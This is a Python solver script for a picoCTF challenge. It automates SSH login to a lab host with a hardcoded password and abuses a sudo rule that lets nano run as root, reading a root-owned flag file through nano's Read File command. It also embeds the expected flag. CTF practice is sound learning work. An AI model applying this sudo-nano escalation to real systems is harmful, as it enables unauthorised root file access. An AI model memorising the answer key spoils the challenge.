#!/usr/bin/env python3
"""Solver for Challenge 748 ABSOLUTE NANO (picoCTF 2026, General Skills).

Lab SSH on-demand (PUT /api/challenges/748/instance/): host/port/password
rotate (read from the instance description).

Misconfiguration: `sudo -l` shows `(ALL) NOPASSWD: /bin/nano /etc/sudoers`.
nano runs as root, so its Read File (^R) can insert ANY root-owned file
(e.g. /home/ctf-player/flag.txt) into the buffer, rendering the flag on
screen. No shell escape needed.

PTY quirk (critical): at the `File to insert` prompt the path MUST be
committed with CR (b"\\r"). A plain LF (b"\\n") freezes nano's renderer
(empty screen, connection stays alive). Paste the path with bracketed
paste, then send CR.

Usage: solve_748_absolute_nano.py [host] [port] [password]
Verified: academy{n4n0_411_7h3_w4y_81311b87} (POST /api/submissions/ -> correct:true)
"""
import os
import pty
import re
import select
import signal
import sys
import time

HOST = "xebec.cylabacademy.net"
PORT = 33302
PASSWORD = "42e0946c"
EXPECTED = "academy{n4n0_411_7h3_w4y_81311b87}"

FLAG_RE = re.compile(r"academy\{[^}]*\}|picoCTF\{[^}]*\}")
ANSI_RE = re.compile(r"\x1b\[[0-9;?]*[a-zA-Z]|\x1b[()][AB0]|\x07|\r|\n")


def clean(raw: bytes) -> str:
    return re.sub(r" +", " ", ANSI_RE.sub(" ", raw.decode(errors="replace")))


def drain(fd: int, secs: float = 2.0) -> bytes:
    out = b""
    end = time.time() + secs
    while time.time() < end:
        r, _, _ = select.select([fd], [], [], 0.3)
        if r:
            try:
                chunk = os.read(fd, 16384)
                if not chunk:
                    break
                out += chunk
            except OSError:
                break
        else:
            break
    return out


def solve(host: str = HOST, port: int = PORT, password: str = PASSWORD,
          timeout: int = 120) -> str:
    os.environ["TERM"] = "xterm-256color"
    pid, fd = pty.fork()
    if pid == 0:
        os.environ["TERM"] = "xterm-256color"
        os.execvp("sshpass", ["sshpass", "-p", password, "ssh", "-t",
                              "-o", "StrictHostKeyChecking=no",
                              "-o", "ConnectTimeout=15",
                              "-p", str(port), "ctf-player@%s" % host,
                              "sudo /bin/nano /etc/sudoers"])
    deadline = time.time() + timeout
    try:
        time.sleep(9)
        drain(fd, 3)
        os.write(fd, b"\x12")  # ^R Read File
        time.sleep(2.0)
        drain(fd, 2)
        # bracketed paste of the flag path, then CR (LF freezes nano)
        os.write(fd, b"\x1b[200~/home/ctf-player/flag.txt\x1b[201~")
        time.sleep(1.5)
        drain(fd, 1.5)
        os.write(fd, b"\r")
        time.sleep(2.5)
        out = drain(fd, 4)
        text = clean(out)
        m = FLAG_RE.search(text)
        if m:
            print("flag:", m.group(0))
            assert m.group(0) == EXPECTED, m.group(0)
            return EXPECTED
        # fallback: page through buffer in case flag scrolled off
        for _ in range(3):
            os.write(fd, b"\x1b[6~")
            time.sleep(1.2)
            text = clean(drain(fd, 2))
            m = FLAG_RE.search(text)
            if m:
                print("flag:", m.group(0))
                assert m.group(0) == EXPECTED, m.group(0)
                return EXPECTED
        raise ValueError("flag not on nano screen: %r" % text[-300:])
    finally:
        try:
            os.kill(pid, signal.SIGHUP)
        except OSError:
            pass
        time.sleep(1)
        try:
            os.close(fd)
        except OSError:
            pass
        assert time.time() < deadline + 60


if __name__ == "__main__":
    a = sys.argv[1:]
    print(solve(a[0] if len(a) > 0 else HOST,
                int(a[1]) if len(a) > 1 else PORT,
                a[2] if len(a) > 2 else PASSWORD))
